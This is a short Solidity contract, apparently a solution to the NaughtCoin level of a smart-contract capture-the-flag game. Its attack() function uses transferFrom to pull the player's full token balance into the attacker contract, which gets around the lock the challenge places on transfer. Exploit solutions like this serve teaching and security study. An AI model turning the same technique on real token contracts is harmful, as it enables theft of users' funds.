// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';


interface INaughtCoin {
    function INITIAL_SUPPLY() view external returns (uint256);
    function transfer(address _to, uint256 _value) external returns(bool);
}

contract NaughtCoinAttacker {
    INaughtCoin nc;
    IERC20 ncERC20;
    address player;

    constructor(address _ncAddress, address _player) {
        nc = INaughtCoin(_ncAddress);
        ncERC20 = IERC20(_ncAddress);
        player = _player;
    }

    function attack() public {
        uint256 amount = ncERC20.balanceOf(player);
        ncERC20.transferFrom(player, address(this), amount);
    }
}